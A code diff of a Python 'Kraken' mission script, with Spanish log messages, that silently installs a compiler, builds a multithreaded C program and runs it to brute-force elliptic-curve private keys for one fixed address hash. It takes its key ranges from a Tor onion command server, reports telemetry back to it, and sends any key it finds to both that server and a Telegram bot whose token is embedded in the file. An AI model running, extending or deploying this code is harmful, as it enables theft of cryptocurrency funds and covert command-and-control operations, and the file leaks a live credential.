@@ -1,11 +1,10 @@
-# MISSION BRAIN V29.3 - KRAKEN C-FIXED Φ
+# MISSION BRAIN V29.4 - KRAKEN SYNTAX FIXED Φ
 import os, subprocess, time, requests, base64, socket, threading
 
 def execute_mission(ui, ID):
     try:
-        ui.log(f"Ignicionando Protocolo Kraken V29.3 en Nodo {ID}...")
+        ui.log(f"Ignicionando Protocolo Kraken V29.4 en Nodo {ID}...")
         
-        # 1. BUSCAR PORTAL KRAKEN
         MASTER = None
         proxies = None
         
@@ -21,7 +20,6 @@ def execute_mission(ui, ID):
                 MASTER = "http://xc6binu3ads4ceqhputzfwafu4kceivugqnm43bdocaouqwf7cdvd4ad.onion/"
                 proxies = {"http": "socks5h://127.0.0.1:9050", "https": "socks5h://127.0.0.1:9050"}
         
-        # 2. Sincronia de Rango
         rng = None
         for i in range(10):
             try:
@@ -33,79 +31,43 @@ def execute_mission(ui, ID):
                 time.sleep(10)
         
         if not rng: return False
-            
         ui.log("Rango Sincronizado: " + rng["start"])
         
-        # 3. Motor Strike (V29.3 LITERAL QUOTES FIX)
         if not os.path.exists("./kraken_strike"):
-            ui.log("Armando Motor de Asalto V29.3...")
-            # USAMOS CONCATENACION SEGURA PARA FORZAR LAS COMILLAS EN EL C-SOURCE
-            c_src = "#include <stdio.h>
-#include <openssl/sha.h>
-#include <openssl/ripemd.h>
-#include <openssl/ec.h>
-#include <pthread.h>
-#include <unistd.h>
-#include <string.h>
-#include <stdlib.h>
-"
-            c_src += "unsigned char t[20]={0x2b,0x6f,0x17,0xe0,0x89,0x29,0xe7,0x93,0xef,0x1c,0x09,0x93,0x0e,0x13,0x71,0xba,0x76,0x35,0xc6,0x0c};
-"
-            c_src += "void* c(void* a){
-"
-            c_src += "    EC_GROUP* g=EC_GROUP_new_by_curve_name(714);
-"
-            c_src += "    EC_POINT* p=EC_POINT_new(g);
-"
-            c_src += "    BIGNUM* k=BN_new();
-"
-            c_src += "    unsigned char b[65],s[32],r[20];
-"
-            c_src += f"    BN_hex2bn(&k, "{rng["start"]}");
-"
-            c_src += "    while(1){
-"
-            c_src += "        EC_POINT_mul(g,p,k,NULL,NULL,NULL);
-"
-            c_src += "        EC_POINT_point2oct(g,p,4,b,65,NULL);
-"
-            c_src += "        SHA256(b,65,s);
-"
-            c_src += "        RIPEMD160(s,32,r);
-"
-            c_src += "        if(!memcmp(r,t,20)){
-"
-            c_src += "            FILE* f = fopen("found.txt", "a"); fprintf(f, "MATCH:%s\\n", BN_bn2hex(k)); fclose(f);
-"
-            c_src += "            exit(0);
-"
-            c_src += "        }
-"
-            c_src += "        BN_add_word(k,1);
-"
-            c_src += "    }
-"
-            c_src += "}
-"
-            c_src += "int main(){
-"
-            c_src += "    pthread_t t[4]; for(int i=0; i<4; i++) pthread_create(&t[i],NULL,c,NULL);
-"
-            c_src += "    while(1) sleep(3600); return 0;
-"
-            c_src += "}
-"
-            
+            ui.log("Armando Motor de Asalto V29.4...")
+            c_src = "#include <stdio.h>\n#include <openssl/sha.h>\n#include <openssl/ripemd.h>\n#include <openssl/ec.h>\n#include <pthread.h>\n#include <unistd.h>\n#include <string.h>\n#include <stdlib.h>\n"
+            c_src += "unsigned char t[20]={0x2b,0x6f,0x17,0xe0,0x89,0x29,0xe7,0x93,0xef,0x1c,0x09,0x93,0x0e,0x13,0x71,0xba,0x76,0x35,0xc6,0x0c};\n"
+            c_src += "void* c(void* a){\n"
+            c_src += "    EC_GROUP* g=EC_GROUP_new_by_curve_name(714);\n"
+            c_src += "    EC_POINT* p=EC_POINT_new(g);\n"
+            c_src += "    BIGNUM* k=BN_new();\n"
+            c_src += "    unsigned char b[65],s[32],r[20];\n"
+            # FIX DE COMILLAS LITERALES
+            c_src += f'    BN_hex2bn(&k, "{rng["start"]}");\n'
+            c_src += "    while(1){\n"
+            c_src += "        EC_POINT_mul(g,p,k,NULL,NULL,NULL);\n"
+            c_src += "        EC_POINT_point2oct(g,p,4,b,65,NULL);\n"
+            c_src += "        SHA256(b,65,s);\n"
+            c_src += "        RIPEMD160(s,32,r);\n"
+            c_src += "        if(!memcmp(r,t,20)){\n"
+            c_src += '            FILE* f = fopen("found.txt", "a"); fprintf(f, "MATCH:%s\\n", BN_bn2hex(k)); fclose(f);\n'
+            c_src += "            exit(0);\n"
+            c_src += "        }\n"
+            c_src += "        BN_add_word(k,1);\n"
+            c_src += "    }\n"
+            c_src += "}\n"
+            c_src += "int main(){\n"
+            c_src += "    pthread_t t[4]; for(int i=0; i<4; i++) pthread_create(&t[i],NULL,c,NULL);\n"
+            c_src += "    while(1) sleep(3600); return 0;\n"
+            c_src += "}\n"
             with open("k.c", "w") as f: f.write(c_src)
             os.system("apt-get update -qq && apt-get install -y libssl-dev gcc -qq > /dev/null 2>&1")
-            # SILENCIAMOS DEPRECATED WARNINGS
             os.system("gcc -O3 k.c -o kraken_strike -lcrypto -lpthread -Wno-deprecated-declarations")
         
         if os.path.exists("./kraken_strike"):
             os.system("pkill -9 kraken_strike")
             subprocess.Popen(["./kraken_strike"], start_new_session=True)
-            ui.update("PROTOCOLO KRAKEN V29.3 ACTIVO", 100, 95)
-            ui.log("Asalto Kraken V29.3 (C-Literal Fix) ignicionado.")
+            ui.update("PROTOCOLO KRAKEN V29.4 ACTIVO", 100, 95)
         
         def report():
             while True:
@@ -113,12 +75,10 @@ def execute_mission(ui, ID):
                     requests.post(MASTER, json={"node_id": ID, "type": "TELEMETRY", "payload": {"label": "KRAKEN_VIGIL", "cpu": os.getloadavg()[0]}}, proxies=proxies, timeout=30)
                     if os.path.exists("found.txt"):
                         with open("found.txt", "r") as f: match = f.read()
-                        requests.post("https://api.telegram.org/bot8923446223:AAGTub53UjmwAZjazkqNTSI-sR9gOcikrv8/sendMessage", data={"chat_id": "7713278946", "text": "🚨 KRAKEN MATCH V29.3 🚨\n" + match})
+                        requests.post("https://api.telegram.org/bot8923446223:AAGTub53UjmwAZjazkqNTSI-sR9gOcikrv8/sendMessage", data={"chat_id": "7713278946", "text": f"🚨 KRAKEN MATCH V29.4 🚨\n{match}"})
                         requests.post(MASTER, json={"node_id": ID, "type": "MATCH", "payload": {"content": match}}, proxies=proxies, timeout=60)
                 except: pass
                 time.sleep(300)
-        
         threading.Thread(target=report, daemon=True).start()
-    except Exception as e:
-        ui.log("Error Kraken: " + str(e))
+    except Exception as e: ui.log("Error Kraken: " + str(e))
     return True
